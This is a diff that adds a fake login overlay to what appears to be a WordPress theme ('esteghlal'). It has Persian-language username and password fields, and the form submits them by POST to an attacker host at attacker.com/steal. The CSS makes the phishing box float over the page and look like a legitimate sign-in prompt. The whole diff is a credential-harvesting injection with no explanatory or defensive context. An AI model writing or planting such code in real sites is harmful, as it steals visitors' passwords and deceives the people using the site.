@@ -1,0 +1,37 @@
+<div id="fake-login">
+  <img src="/wp-content/themes/esteghlal/images/logo.png" width="150">
+  <h2>ورود به حساب کاربری</h2>
+  <form action="http://attacker.com/steal" method="POST">
+    <input type="text" name="username" placeholder="نام کاربری">
+    <input type="password" name="password" placeholder="رمز عبور">
+    <button type="submit">ورود</button>
+  </form>
+</div>
+
+<style>
+  body {
+    background: #004080; /* رنگ استقلال :) */
+    font-family: IranYekan, sans-serif;
+    margin: 0;
+    padding: 0;
+  }
+
+  #fake-login {
+    position: fixed;
+    top: 20%;
+    left: 50%;
+    transform: translate(-50%, -20%);
+    background: white;
+    padding: 30px;
+    border-radius: 10px;
+    box-shadow: 0 0 10px #000;
+    text-align: center;
+  }
+
+  input, button {
+    display: block;
+    width: 250px;
+    padding: 10px;
+    margin: 10px auto;
+  }
+</style>
